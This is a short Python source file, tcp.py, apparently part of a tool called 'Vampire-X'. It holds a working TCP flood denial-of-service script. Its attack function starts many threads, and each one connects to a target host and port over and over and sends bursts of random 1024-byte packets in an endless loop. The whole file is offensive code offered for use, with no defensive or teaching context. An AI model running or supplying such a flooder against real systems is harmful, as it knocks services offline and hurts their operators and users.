# tcp.py

import socket
import threading
import random
import time
import os

def attack(target, port, threads):
    print(f"\n[TCP] Vampire-X TCP Attack started on {target}:{port} with {threads} threads\n")
    
    packet = random._urandom(1024)

    def tcp_flood():
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((target, port))
                for _ in range(100):
                    s.send(packet)
                s.close()
                print(f"[TCP] Packet sent to {target}:{port}")
            except socket.timeout:
                print(f"[TCP] Connection to {target}:{port} timed out.")
            except Exception as e:
                print(f"[TCP] Error: {str(e)}")

    for _ in range(threads):
        t = threading.Thread(target=tcp_flood)
        t.daemon = True
        t.start()
